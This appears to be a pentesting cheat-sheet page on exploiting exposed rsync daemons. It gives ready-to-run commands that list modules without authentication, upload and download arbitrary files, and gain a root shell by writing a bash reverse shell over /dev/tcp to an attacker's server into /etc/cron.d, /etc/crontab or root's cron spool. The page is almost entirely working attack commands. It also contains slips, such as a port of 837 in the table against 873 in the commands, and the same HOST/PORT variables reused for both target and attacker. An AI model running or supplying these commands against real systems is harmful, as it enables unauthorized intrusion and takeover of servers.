# Rsync

<details>

<summary>Introduction</summary>

Rsync（Remote Sync）是一种快速、多功能的文件同步工具，用于在本地和远程系统之间同步文件和目录。它通过比较源和目标文件的差异，仅传输发生更改的部分，从而最大程度地减少传输的数据量和时间。Rsync支持加密传输和压缩，使其在安全性和效率方面表现优异。Rsync 主要用于文件备份、数据同步、镜像站点和远程文件传输等。

</details>

<table><thead><tr><th width="178">Name</th><th>Rsync (Remote Sync)</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>837</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>Unauthorized Access (Leak Information)</li><li>File Upload (GetShell)</li><li>File Download</li></ul></td></tr></tbody></table>

## Unauthorized Access

If the rsync service allows unauthorized access, you can use the rsync command to connect.

{% code title="Environment" %}
```bash
HOST=; PORT=873; # TARGET HOST INFO
```
{% endcode %}

{% code title="Connect" %}
```bash
rsync rsync://$HOST:$PORT/
```
{% endcode %}

## File Upload

{% code title="Environment" %}
```bash
HOST=; PORT=873; # TARGET HOST
HOST=; PORT=6789; # YOUR VPS
```
{% endcode %}

{% code title="File Upload" %}
```bash
rsync -av LOCAL_FILE rsync://$HOST:$PORT/src/REMOTE_FILE
```
{% endcode %}

{% code title="Linux crontab GetShell" %}
```bash
# Global crontab (1)
echo "* * * * * root /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1" > reverse_shell
rsync -av reverse_shell rsync://$HOST:$PORT/src/etc/cron.d/reverse_shell

# Global crontab (2) The original file will be overwritten
echo "* * * * * root /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1" > reverse_shell
rsync -av reverse_shell rsync://$HOST:$PORT/src/etc/crontab

# User crontab. The original file will be overwritten
echo "* * * * * /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1" > reverse_shell_root
rsync -av reverse_shell_root rsync://$HOST:$PORT/src/etc/cron.d/var/spool/cron/root
```
{% endcode %}

## File Download

{% code title="Environment" %}
```bash
HOST=; PORT=873; # TARGET HOST
```
{% endcode %}

{% code title="File Download" %}
```bash
rsync -av rsync://$HOST:$PORT/src/REMOTE_FILE LOCAL_FILE
```
{% endcode %}
